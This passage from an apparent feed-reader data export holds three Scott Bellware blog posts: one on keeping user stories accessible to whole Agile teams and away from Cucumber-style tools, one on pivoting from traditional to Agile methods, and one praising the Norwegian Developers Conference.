It's obviously an essential part of doing product development work successfully. But it's easy to mistake early-stage work as the domain of \"analysis and design\" due to the absence of material product this early in the game. The absence of material product at early stages should be a conspicuous absence, but the conspicuousness is typically lost to cognitive filters.<br /><br />The disastrous side effect of failing to recognize this<span style=\"font-style: italic;\">negative space perspective</span>is the mistaken conclusion that analysis and design is the sole domain of early-stage work. And it starts the people involved in software work on the slippery slope toward believing that work on requirements analysis only happens early in the process, and that requirements - once defined - will not have to change. As if we could really know anything so conclusive so early in the process of uncovering clarity and understanding.<br /><br />In the end, early stage work is naturally limited in that it can usually only be conceptual work. Conceptual work is realistically the only work that<span style=\"font-style: italic;\">can</span>be done so early. While the accumulation of responsibilities at work steps later in the process continues, analysis and design never wane. New clarity and new understanding never subsides. In fact, clarity and understanding only get sharper. This continues even once a software product has been made operational.<br /><br />Because understanding continues to get sharper the further along we are, any concrete record of our understanding must be kept up-to-date to make sure that our collective clarity remains collective. Otherwise, workers at different stages of the whole process will have different understandings of what the goal is - as currently defined by all recent learning.<br /><br />Making sure that everyone is on the same page is of paramount importance in any development effort. Locking down the definition of what's needed isn't the way to do this - although it's often the mistaken path that software organizations take when they fail to recognize the cumulative nature of understanding and clarity as product development unfolds.<br /><br />To keep everyone on the same page, user stories must be accessible to everyone involved in a development effort, from early-stage conceptual work, all the way through delivery when placeholders like user stories are replaced with concrete, material product. They must be accessible with the least amount of effort by all people involved and at all stages and work steps.<br /><br />At any point in the whole process, anyone who is empowered to add user stories, change existing ones, remove user stories, or otherwise make use of them should not have to go through a worker with specialized tool skills due to user stories having been removed to a tool that is not generally-accessible with an absolute minimum of effort and a maximum of immediacy.<br /><br />Stated as a general principle: No single work group at any work step should remove user stories to a medium that, while more expedient to their work, causes user stories to become less accessible by others with different skills and responsibilities.<br /><br />The inevitable result of workers at a work step feeling that user stories can be removed to a more<a href=\"http://en.wikipedia.org/wiki/Local_optimum\">locally-optimized</a>medium is that separate copies of a user story will be used by workers at different work steps, and these copies will inevitably diverge. When multiple copies of the same user story diverge, workers at different work steps have different understandings of expectations and goals, and work at cross purposes.<br /><br />In the worst of these situations, workers at different work steps aren't even aware of the others' divergent versions of the truth, and labor under the resulting conflict without any idea as to why expectations are consistently not being met. This drives up rework, reduces the credibility of the team, increases stress and conflict on the team, and generally leads back to the chaos that Agile development was supposed to address.<br /><br />And yet, there are indeed advantages to specialized tools for specialized work steps. Great care should be taken though when considering specialized tools for artifacts that aren't specialized. It's often a mistake and an oversight when specialized tools are put in place at a work step that makes collective artifacts less accessible for the duration of the work step, or from that work step onward. In the case of user stories, it's hard to find a single artifact that is more collective, public property and thus less amenable to workstep-specialized tools.<br /><br />At every stage of development, workers can back-slide into misconceptions of authority over artifacts that are responsible for unifying the whole effort and for stitching diverse workflows and workers together. The further we get into a software process, the more likely it is that workers at a later stage will remove user stories from more generally-accessible media and sequester them into the bowels of tools that are accessible only to people with specialized skills.<br /><br />For example, consider the<a href=\"http://cukes.info/\">Cucumber framework and tools</a>developed in the Ruby community, and the family of derivatives and clones that have since been created in a host of programming languages.<br /><br />This style of tool encourages the displacement of user stories from more generally-accessible media into programmer-specific media. It doesn't do so accidentally. It's done as a recommended practice - reinforced by articles, books, and software conference presentations and workshops.<br /><br />While Cucumber is built on some fairly compelling technology, and is itself an impressive work, it's not exactly methodologically-sound in that it fails to recognize its own contradiction of Agile development's core value of<a href=\"http://agilemanifesto.org/\"><span style=\"font-style: italic;\">individuals and interactions over processes and tools</span></a>.<br /><br />As an aside, I brought up this issue with Aslak Hellesøy, the Principal of the Cucumber project, during a trip to Sweden last year. At the time, he informed me that work was being done on a tool to extract user stories from the specialized media to make them generally-accessible. But there are three non-trivial oversights inherent with this solution:<br /><br />Firstly, it disregards the a-priory value of whole-team organizational methodologies like Agile by allowing collective and communal artifacts that are fundamental to higher-order productivity to become appropriated by one specialization.<br /><br />Secondly, it seeks to address a problem that exists because of overly-elaborate tooling by creating even more elaborate tooling. The path back to simplicity and clarity - i.e.: \"elegance\" - likely also suggests removing the first wave of tooling rather than adding a second wave of compensating tooling. There are presently solutions that are arguably more holistically-effective as well as arguably more simple and clear. Although, they're based on less elaborate programming technology, and this is likely why the programming specialization remains distracted for alternatives.<br /><br />Thirdly, it doesn't address the need to allow user stories to be added, removed, combined, divided, or changed by anyone with the authority to do so regardless of whether he or she is comfortable with tools, approaches, and perspectives that are more natural to the programmer specialization.<br /><br />A Cucumber-style tool can be justified arguably as a general tool because it serves the whole of the process with testing and specification, but merely serving the whole of the process doesn't atone for the reduction in accessibility and immediacy of collective artifacts.<br /><br />To Aslak's credit, he demonstrated a way of using Cucumber to me where user stories are not removed to its media. Nonetheless, removing user stories to Cucumber media continues to be a practice that is perpetuated in the user community remains a non-trivial methodological problem that is likely rooted in the narrowing of focus of specialized workers due to impressive tooling.<br /><br />NOTE: There are more methodological oversights inherent in these tools, but that's a subject for a subsequent article.<br /><br />Here a some principles to keep in the forefront of your Agile practice amidst the distraction of so many Agile-targeted tools:<br /><br />1.<span style=\"font-style: italic;\">Individuals and interactions over processes and tools</span>has profound meaning. It doesn't suggest that you shouldn't use tools or processes, but that these often become distractions from more powerful means of ensuring success. Consider tooling choices very carefully - especially specialized tooling. Understand how it might inadvertently narrow the perspectives and values of its users.<br /><br />2. User stories are a whole team artifact. Any tool that moves user stories to a medium that the whole team doesn't have at their finger tips should only be used when there are no viable alternatives. Forcing some team members to go through other team members to work with collective artifacts is categorically not what is intended by<span style=\"font-style: italic;\">individuals and interactions over processes and tools</span>- even if it does cause people to work together to gain access to resources. These resources are supposed to be generally and immediately accessible to begin with.<br /><br />3. If you choose to remove collective artifacts to workstep-specific tools, put protocols in-place to ensure discrete hand-offs between tools so that multiple versions of the truth are not available to different workers who work in different work steps. When a user story moves from one system to another, destroy the previous version and leave behind a placeholder - a kind of<span style=\"font-style: italic;\">forwarding address</span>for a user story - that tells the interested party how to find the user story's new home.<br /><br />4. Don't fool yourself into believing that you'll be able to keep multiple versions of user stories in-sync through the life of a project. This kind of work is too costly to keep up and will be quickly abandoned by the project team, leading straight back to the<span style=\"font-style: italic;\">multiple versions of the truth</span>problems. Adding customized electronic synchronization automation to this problem is also not a good answer. This just adds more elaborateness to a situation that is possibly already too inelegant. It's a problem that likely shouldn't exist in the first place.<br /><br />The inescapable truth of user story management is that the least-elaborate technology is often the most productive solution - even if the technology is no more elaborate than a ten-foot by five-foot cork board with index cards pinned to it. In the very least, this keeps user stories immediately visible and accessible, and makes changing them no more difficult than putting pen to paper.<br /><br />Of course, the tried and true cork board and index card solution isn't a good foot for all teams. That said, as you seek more elaborate solutions, take tiny steps forward in settling on your solution. A leaping at the most elaborate solution for user story management usually ends up planting a whole team in a tool that serves the specialized perspective of the people doing the tool selection - often to the disservice of everyone else involved in the whole effort.<br /><br />It's vital that we're not lured into local optima interpretations like, \"individuals and interactions over tools and processes<span style=\"font-style: italic;\">except when the tools are intellectually stimulating</span>\". All tools are intellectually stimulating. In many cases, tools can be stimulating to distraction. The problem is what we're being distracted from: the essential root cause of success in software product development. Namely, the magnification of understanding and clarity that comes from interactions between individuals over the course of time. The deeper problem is that we believe ourselves to be impervious to this kind of distraction because we have such positive feelings about our tool choices.<br /><br />The immediacy and accessibility of user stories is a foundational corner stone that your Agile house is built on. Whether it stands strong and continues to be built upon, or whether it crumbles under its own weight can be decided entirely by this salient factor.<br /><br />Do everything you can to make sure that user stories continue to belong to everyone, in every minute of every day. And be vigilant against any backsliding into specialized expediencies that remove user stories to any medium that is less immediate or less accessible than the simplest and clearest of tools at our disposal. An elegant solution is often not an elaborate one, but greater whole-team productivity is always more stimulating than elaborate, specialized tools.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=NGSbe8s34mE:qfGyU0HhnAA:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=NGSbe8s34mE:qfGyU0HhnAA:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=NGSbe8s34mE:qfGyU0HhnAA:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/NGSbe8s34mE\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1055}}
{"k":"0000000084","o":"0000017573","v":"001"}
{"_id":1056,"_uid":1056,"_dt":1373742611902,"_s":"25135714993874166d153e57352e2da0"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/Mzh8U-CTnsg/least-way-pivoting-away-from-agile.html","title":"The Least Way: Pivoting Away from Agile Excess","published":{"$wrap":"$date","v":1287608400000,"h":"2010-10-20T21:00:00.000Z"},"starred":false,"read":false,"content":"One of the most compelling justifications for Agile development methods and techniques is made through a comparison of the cost curves of both Agile and \"traditional\", or \"non-Agile\" methods.<br /><br />When Agile was new and its case was pleaded more frequently, the following graphic was quite common:<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9eNk9HktI/AAAAAAAAAK0/Ws5xDR5N4Zw/s1600/cost_curves.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 217px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9eNk9HktI/AAAAAAAAAK0/Ws5xDR5N4Zw/s400/cost_curves.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530242454785594066\" /></a><span style=\"color: rgb(102, 102, 102);\">NOTE: The above graphic is intended to represent to relative shape of the cost curves, and not convey exact scales for your organization. Your own organization's cost curve mileage may vary.</span><br /><br /><span style=\"font-weight:bold;\">The Cost of Traditional Development</span><br /><br />The essential proposition is that the cost of a unit of software development effort gets exponentially higher as a project progresses. The same curve represents the cost of change of existing features equally as well as the cost of adding new features.<br /><br />The underlying principle is pretty straight-forward: the more stuff you have, the more stuff that will go wrong that you can't predict and that you don't detect. The more stuff going wrong, the more rework in-progress. Rework is the crumbly raw material that makes all foundations shaky - be they the foundations of software, or the foundations of the plan.<br /><br />The number of modules in a software project increases as a project progresses. The number of inter-relationships between modules grows as the number of modules grows. The number of unpredictable repercussions of any change to existing modules or addition of new modules, as well as the extent that repercussions dissipate throughout a system of modules, increases as the number of inter-relationships increases.<br /><br />When there are fewer modules, it's much more straight-forward to add new modules. However, at a critical turning point, this ease rapidly erodes and it becomes exponentially more difficult to get work done without undoing work that was done previously.<br /><br />The more modules in a system, the more likely that any new additions or changes will cause adjacent modules to no longer work as they once had, and to no longer work correctly. The longer that they stay in this incorrect state, the more that other adjacent modules will be built incorrectly, or built<a href=\"http://blog.scottbellware.com/2009/02/design-flaws-hernias-and-anemic-quality.html\">in a way that reduces development productivity</a>.<br /><br />The more modules that are in a system, the less likely it is that its programmers can assess any detrimental effects brought about by changes. The system becomes an increasingly unsolvable puzzle that must be solved every time a change is made to add new code or to change existing code. Early on in the life of a system, the puzzle is dead-simple to solve. As the number of modules grow, the possibility of solving that puzzle with every new change closes in on improbable. This is the source of the extra effort that accretes around software development as time goes on.<br /><br /><span style=\"font-weight:bold;\">How Agile Flattens the Traditional Costs</span><br /><br />The Agile cost curve is fundamentally different. It was such a radical re-imagining of managing the factors that influence the cost curve that it was frequently dismissed out-of-hand, despite affirmations and reports from people who had given it an honest empirical and experiential trial.<br /><br />Agile development's power rests in the drive to recognize the conditions that cause the cost of effort to increase over time. It uses techniques that keep effort leveled over the length of a software project, rather than allowing them to spiral toward the inconceivable, unpredictable, and unmanageable.<br /><br />The cost of change is controllable only when you can predict whether any change will have detrimental consequences. You need to be able to apply countermeasures immediately when any of these detriments are created. The longer the wait to detect a design flaw, the faster the cost grows. This ultimately leads to the vicious circle of rework, where problems are found after the work is delivered to the next phase in the development process, while developers continue to build on that work, believing it to be a sound foundation.<br /><br />In other words, Agile's radical re-shaping of the traditional cost curve comes from the ability for workers to easily and continuously check that their work isn't a cost magnet while that work is still open on their workbenches. They embrace a principled understanding of the kinds of software designs that are directly and easily tested, and a diligence paid to recognizing, avoiding, and remediating designs that aren't.<br /><br />And of utmost and paramount concern - concern that can make or break an Agile effort: that organizations realize that its the rigidity of organizations and organizational systems and behaviors that obstruct software development from being done in a way that allows software workers and teams to rehabilitate the traditional cost curve. The impact to organizations - especially entitlements to silos and rigidity - can be profound. Organizations adopting Agile have a responsibility to shift from defensible, garrisoned blame cultures to proactive, optimized learning cultures. If the organizational and management system locks the steering wheel into one, largely immovable position, there should be little surprise when projects end up in the productivity ditch.<br /><br />The Agile cost curve also suggests that there's a bit of a startup tax to pay up front, but that once the initial bump is navigated, productivity stabilizes and becomes much more predictable.<br /><br />This is in contrast to traditional methods where the inherent absence of complications early-on lulls developers and managers into a false sense of success. They fail to practice productive countermeasures from the very start by failing to recognize the technical and organizational naivete inherent in the work. The success doesn't last. It's outlived by the realities of the exponentially-increasing number of complications that are natural side-effects of the progress of a software development effort.<br /><br /><span style=\"font-weight:bold;\">The Agile Project Startup Tax</span><br /><br />The graphic depicting the Agile cost curve overlaid on the traditional cost curve tells this whole story at a glance. This is what makes it so compelling. And yet, while the Agile cost curve is incredibly compelling, the most interesting point of the graphic isn't so much the benefits that Agile methods avail, but the point on the curve where the lines intersect:<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TL9ed9ojGRI/AAAAAAAAAK8/mb_NayXl-vY/s1600/intersection.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 218px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TL9ed9ojGRI/AAAAAAAAAK8/mb_NayXl-vY/s400/intersection.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530242736288110866\" /></a><br />Before that point, Agile development has a higher cost. Before that point, traditional methods should have a lower cost. The time spent using by-the-book, colloquial Agile development techniques before the point where traditional techniques become too costly is a likley volunteer mission for exacerbated costs.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9eunYzHyI/AAAAAAAAALE/-D7KLIF5Clc/s1600/avoidable.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 218px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9eunYzHyI/AAAAAAAAALE/-D7KLIF5Clc/s400/avoidable.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243022374248226\" /></a><br /><span style=\"font-weight:bold;\">The Best (or Least) of Both</span><br /><br />A methodology that uses aspects of traditional development<span style=\"font-style: italic;\">up to the point the costs of traditional methods are on the verge of spiraling out of control</span>, and then makes a methodological \"pivot\" to techniques that can be considered \"Agile\" can reap the benefits of each approach's strengths.<br /><br />Such a \"blended\" approach takes advantage of traditional methods that, while unsustainable, can deliver more bang for the buck up-front. The resulting path has the least amount of cost if the pivot is well-executed.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fFW5kPkI/AAAAAAAAALM/8EDugN_aLB0/s1600/blended.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 218px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fFW5kPkI/AAAAAAAAALM/8EDugN_aLB0/s400/blended.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243413085273666\" /></a><br />The resulting methodology is both traditional and Agile based on where work is in the project timeline and in the smaller development cycles. Neither its traditional aspects nor its Agile aspects are left unchanged by the imperatives of blending what is usually seen as incompatible methods into a continuum. But the most effective and salient principles of development productivity remain in-play.<br /><br />My own practice of that continuum is informed by Lean Development, and more recently by the Lean Startup movement and its understanding of up-front phases that are often not mentioned by predominating methods like Scrum, and traditional methods that came before.<br /><br /><span style=\"font-weight:bold;\">The Least Way</span><br /><br />I was bemoaning failures with Agile and Agile community to<a href=\"http://blog.asmartbear.com/\" target=\"_blank\">Jason Cohen</a>a couple of years ago. He offered the \"The Least Way\" as a name for the approach that I was embracing to deal with a number of the issues with Agile stasis and orthodoxy that I was trying to work around. I'll ultimately add more meat to those bones on<a href=\"http://leastway.org\" target=\"_blank\">LeastWay.org</a>, and talk about how it underlies some<a href=\"http://floverse.com\" target=\"_blank\">tooling that I'm working on</a>, and how it has affected work on projects. Maybe you'll find it as useful as I have if packaged up in a consumable form.<br /><br />One of the key differences between an approach that doesn't just cherry pick techniques from different methodologies, but executes a full methodological pivot, is the explicit management of that switch. Planning for it, preparing for it, recognizing the right time to make the pivot, and making a clean entrance and exit from it is a bonafide part of the practice.<br /><br />Missing the pivot is like missing the last exit before entering the<a href=\"http://en.wikipedia.org/wiki/Lake_Pontchartrain_Causeway\" target=\"_blank\">Lake Pontchartrain Causeway</a>. By the time you've realized that you've zoomed past your best chance to take the turn off, you've likely been captured by the gravity well that will start you toward the acceleration of costs. The cost curve begins it's rapid incline immediately after the pivot. The longer it takes to realize that you've missed the turnoff, the faster you'll be traveling, and the more you'll have to spend to put on the breaks and get back on-track toward managing the cost-per-effort.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fU4-2rhI/AAAAAAAAALU/7Ii6plQBBJk/s1600/missed.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 219px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TL9fU4-2rhI/AAAAAAAAALU/7Ii6plQBBJk/s400/missed.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243679932296722\" /></a><br />Shaping the whole methodology around the pivot changes some of the conditions that drive staffing and work management at different phases of a whole software effort. It's not just \"changing gears\", but more like changing vehicles while they are still moving: you'd want to have vehicles designed for this specific purpose. Modifying the existing vehicles is a good place to start.<br /><br />With the pivot being a full-fledged part of the methodology, with practices in place to recognize its approach and to execute it cleanly, the cost curve should be smoother, representing the best of what traditional methods have to offer - up to the point that they become unsustainable, and the best of what Agile has to offer - but not before it is sensible.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://2.bp.blogspot.com/_rt8zZqKCZSg/TL9flb2jMCI/AAAAAAAAALc/wY3mtqdR0lw/s1600/least.jpg\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;width: 400px; height: 217px;\" src=\"http://2.bp.blogspot.com/_rt8zZqKCZSg/TL9flb2jMCI/AAAAAAAAALc/wY3mtqdR0lw/s400/least.jpg\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5530243964170612770\" /></a><br />It's easy to see the methodologies as \"one vs. the other\" issues - \"traditional vs. agile\", for example. This perspective can even be helpful when more radical approaches are needed to shake up a rigid, entrenched, silo culture. However, plotting methodologies along a continuum helps us to see those parts of the spectrum where one blends into the other, and to learn to recognize and take advantage of the distinct transitional phases between them that we might otherwise miss or ignore.<br /><br />Our tendency to look at some colors as \"primary\" and those in-between as \"secondary\" is largely an arbitrary side-effect of perceptual bias. The spectrum is one, fluid continuum of material that is neither primary nor secondary. When we choose to see transitional states as secondary, we naturally tend to tune them out. The powerful continuum of abilities that flow smoothly from each other is turned into a checkerboard of disconnected, shallow monotones.<br /><br />Rapid feedback is the lifeblood of software development that doesn't spiral out of control. Agile protects vital feedback mechanisms from becoming calcified after a projects initial phases. Traditional methods provide rapid - but unsustainable - access to product and customer feedback early-on. Leveraging both and planning for and executing the transition as a fully-fledged part of the methodology rather than a secondary interest is a good part of navigating a \"least way\" of development obstructions (and costs).<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Mzh8U-CTnsg:3g8mEwvCECg:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=Mzh8U-CTnsg:3g8mEwvCECg:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=Mzh8U-CTnsg:3g8mEwvCECg:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/Mzh8U-CTnsg\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1056}}
{"k":"0000000084","o":"0000007166","v":"001"}
{"_id":1057,"_uid":1057,"_dt":1373742611903,"_s":"daaf770465b4ab9dd9b9ea59fc9740c3"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/qRGnAvBp8Bk/praise-for-norwegian-developers.html","title":"Praise for the Norwegian Developers Conference - A Conference with Heart","published":{"$wrap":"$date","v":1277155680006,"h":"2010-06-21T21:28:00.006Z"},"starred":false,"read":false,"content":"Leaving the Norwegian Developers Conference after the last session of the last day, conference participants were bid a fond farewell at the door by Kjersti Sandberg.<br /><br />I suppose it's not such a big deal to have people saying goodbye to participants as they leave, but in the case of the NDC, the person doing the goodbyes was the conference organizer herself.<br /><br />There is a lot to say about the quality and value of a conference like the NDC, but if you trace the outward expressions of quality back to the source of the quality, you inevitably find yourself staring square in the face of leadership. It's Kjersti's leadership that makes the NDC an excellent conference - and in my case, one of the best and most rewarding conference experiences that I've ever had.<br /><br />When you build something that you truly believe in, and when you have intentions to do something great and hold yourself to extremely high standards, that sense of ownership is palpable in every aspect of the work and of the product. The Norwegian Developers Conference in Oslo last week was an obvious expression of leadership, vision, and commitment.<br /><br />I get the sense that being at the door, in person, to bid farewell to conference participants wasn't just the execution of good customer experience technique and strategy, but was a moment for Kjersti to enjoy the fulfillment of hard work and excellent execution. I can't remember a conference where the conference director was so deeply invested in her customers' experience that she was there in person to wish them well and to express her appreciation for their participation.<br /><br />Anyone can fake these kinds of expressions of customer service, but it takes heart to do it and to make it clearly sincere and meaningful.<br /><br />Kjersti wasn't at the door to wish NDC participants a good journey back home and through the next year because it's just smart, personable technique. She was there because it meant as much to her to enjoy the moment of personal and personable accomplishment as the experience of the NDC meant to the people who came to NDC. And it was definitely a moment of absolute pleasure for me to watch something quite rare: a true appreciation for customer experience reflecting a true investment in product and customer development.<br /><br />Kjersti wasn't at the door with a big sign over her head letting people know that she is the person behind the NDC. She was there anonymously. She wasn't there for the show and the display, she was there because it means something for her to be there, and to say farewell in person. It wasn't about a demonstration of investment in customer, it was simply investment in truth incarnate. For me, it was probably the most endearing moment of a conference that overflowed with endearment.<br /><br />There's much more to say about the people involved in making the Norwegian Developers Conference happen. I'd just like to say thanks to everyone at Kjersti's company,<a href=\"http://www.programutvikling.no/\">Program Utvikling</a>, and to Anders Noras, Rune Grothaug, Henriette Holmen, Jakob Bradford, Thale Sandberg, and a host of people who had a role to play in making the NDC a memorable and rewarding human experience.<br /><br />The most important thing about creating a good conference is crafting a space for ideas and perspectives to come together - especially conflicting ideas and perspectives - to learn what new ideas can come from the experience, and to form new, higher order ideas that resolve what we had previously assumed were ideas of irreconcilable difference. It takes courage and integrity to create a space to allow this to happen. The space itself is just a blank slate, it becomes a space of courage and integrity when it reflects these qualities that are already qualities of its leaders.<br /><br />Two salient takeaways for myself from my experience at conferences in Scandinavia:<br /><br />Firstly, Scandinavian conferences, like NDC, Oredev, and others, don't seem to allow the kind of mindless orthodoxy that is eroding integrity in many conferences in the United States. They encourage encounters of diversity that, while tense, inevitably lead to the greatest ideas of the future, and point the way to the next steps.<br /><br />And secondly, the United States conference market is in desperate need of a practitioner-level conference like the kind I've experienced in Scandinavia - especially in the Microsoft community, where diversity is increasingly avoided and, in some cases, actively suppressed. My hope beyond hope is that we'll see one of these conferences on our shores soon, and that their influence will help to get the community focused on goals that are more important to society as a whole than they are to the imperatives of a particular player's interests.<br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=qRGnAvBp8Bk:WTh27na7Y9k:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=qRGnAvBp8Bk:WTh27na7Y9k:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=qRGnAvBp8Bk:WTh27na7Y9k:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/qRGnAvBp8Bk\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1057}}
